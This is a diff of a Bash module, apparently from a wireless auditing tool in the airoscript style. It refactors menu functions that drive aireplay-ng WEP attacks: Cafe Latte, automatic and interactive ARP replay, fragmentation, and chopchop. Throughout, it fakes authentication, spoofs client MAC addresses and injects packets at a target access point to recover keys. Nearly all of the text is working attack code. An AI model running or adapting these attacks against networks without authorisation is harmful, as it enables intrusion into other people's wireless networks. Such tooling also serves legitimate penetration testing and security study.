@@ -16,12 +16,12 @@
 
 # Warning! at least generic, internal and interface must be loaded before this one!
 
-check_function fakeauth3 || source $path/attacks/auth # It depends on auth module ;)
+check_function auth_attacks_fake || source $path/attacks/auth # It depends on auth module ;)
 check_function injectmenu || source $path/attacks/injection # It depends on injection module ;)
 
 check_client(){
-	[[ $Client_MAC ]] && { directed=1; return 0 }
-	select_target
+	[[ $dynamic_client_selection ]] && select_target
+	[[ $Client_MAC != ""  ]] && { directed=1; return 0; }
 }
 
 check_dump_xor(){
@@ -37,7 +37,7 @@ wep_attacks_menu(){
 	help_fifo "${mark}${red}Wep attacks${end}\n"\
 		"You're seeing this menu because the network you selected has WEP encryption\n"\
 		""
-    while true; do $clear  
+    while true; do $clear 
 	    mkmenu "Attacks using a client"\
 		    "ARP replay => Automatic"\
             "ARP replay => Interactive"\
@@ -59,23 +59,19 @@ wep_attacks_menu(){
 }
 
 wep_attacks(){
+    $clear
     attack=$1; shift;
+	hardclean replay_dec-*.xor
+    capture &
     wep_attacks_$attack $@
     $clear;
 }
 
-base_wep_attack(){
-    $clear
-	hardclean replay_dec-*.xor
-    capture &
-}
-
 wep_attacks_caffelate(){
-    capture & 
 	execute  "Cafe Latte Attack on: $Host_SSID "\
 	   	$AIREPLAY -6 -b $Host_MAC -h $FAKE_MAC -x \
 		$INJECTRATE -D $iwifi & 
-	fakeauth3 
+	auth_attacks_fake 
 }
 
 wep_attacks_arpreplay_auto(){
@@ -85,13 +81,21 @@ wep_attacks_arpreplay_auto(){
 		read -p "`gettext 'Enable From or To destination bit (f/t):  '`" FT
 		if [ "$FT" = "" ]; then FT="f"; fi
 	else INJMAC="FF:FF:FF:FF:FF:FF"; FT="f"; fi
-	capture &
 
-	wait_for_execute=1	
-	execute "Injection in Host: $Host_MAC Client $Client_MAC"\
-		$AIREPLAY $iwifi --arpreplay -b $Host_MAC -d $INJMAC\
-		 -$FT 1 -m 68 -n 86  -h $Client_MAC -x $INJECTRATE
-	wait_for_execute=0
+	if [[ $directed ]]; then
+		wait_for_execute=1	
+		execute "Directed injection in Host: $Host_MAC for client $Client_MAC"\
+			$AIREPLAY $iwifi --arpreplay -b $Host_MAC -d $INJMAC\
+			 -$FT 1 -m 68 -n 86  -h $Client_MAC -x $INJECTRATE
+		wait_for_execute=0
+	else
+		auth_attacks_fake &
+		wait_for_execute=1	
+		execute "Injection in Host: $Host_MAC, with fake auth "\
+			$AIREPLAY $iwifi --arpreplay -b $Host_MAC -d $INJMAC\
+			 -$FT 1 -m 68 -n 86  -h $FAKE_MAC -x $INJECTRATE
+		wait_for_execute=0
+	fi
 
 	check_dump_xor && { 
 		wep_attacks pskarp 
@@ -108,38 +112,39 @@ wep_attacks_arpreplay_interactive(){
         read -p "`gettext 'Set framecontrol word (hex): (0841) '`" FT
         if [ "$FT" = "" ]; then FT="0841"; fi
     else INJMAC="FF:FF:FF:FF:FF:FF"; FT="0841"; fi
-    capture & execute "Interactive Packet Sel on: $Host_SSID" $AIREPLAY $iwifi --interactive -p $FT -c $INJMAC -b $Host_MAC $Client_MAC -x $INJECTRATE 
+    if [[ $directed ]]; then
+		execute "Interactive Packet Sel on: $Host_SSID" $AIREPLAY $iwifi --interactive -p $FT -c $INJMAC -b $Host_MAC $Client_MAC -x $INJECTRATE 
+	else
+		auth_attacks_fake &
+		execute "Interactive Packet Sel on: $Host_SSID" $AIREPLAY $iwifi --interactive -p $FT -c $INJMAC -b $Host_MAC $Client_MAC -x $INJECTRATE 
+	fi
 }
 
 wep_attacks_fragmentation(){
     rm -rf fragment-*.xor $DUMP_PATH/frag_*.cap $DUMP_PATH/$Host_MAC*
-    killall -9 airodump-ng aireplay-ng 
-
-    if [ $1 ==  "NC" ]; then    
+    killall -9 airodump-ng aireplay-ng
+    if [[ $directed != 1 ]]; then
         execute "Fragmentation w/o client" $AIREPLAY -5 -b $Host_MAC -h\
             $FAKE_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $iwifi &
-			capture &
 			choose_fake &
-			injectmenu frag
     else
         execute "Fragmentation attack" $AIREPLAY -7 -b $Host_MAC -h $Client_MAC\
             -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $iwifi & capture &  injectmenu frag
     fi
+	injectmenu frag
 }
 
 wep_attacks_chopchop(){
-	base_wep_attack;
-	fakeauth3 &
-    execute "Chopchoping: $Host_MAC"\
-		$AIREPLAY --chopchop -b $Host_MAC -h $FAKE_MAC $iwifi & 
-	injectmenu chopchop
-}
-
-wep_attacks_chopchopclient(){
     $clear
 	hardclean replay_dec-*.xor
     capture &
-	execute "ChopChoping: $Host_SSID"\
-		$AIREPLAY --chopchop -h $Client_MAC $iwifi &
+	[[ $directed ]] || {
+		execute "Chopchoping at $Host_SSID"\
+			$AIREPLAY --chopchop -b $Host_MAC -h $FAKE_MAC $iwifi & 
+		auth_attacks_fake &
+	} && {
+		execute "Directed ChopChoping to $Client_MAC at $Host_SSID"\
+			$AIREPLAY --chopchop -h $Client_MAC $iwifi &
+	}
 	injectmenu chopchop
 }
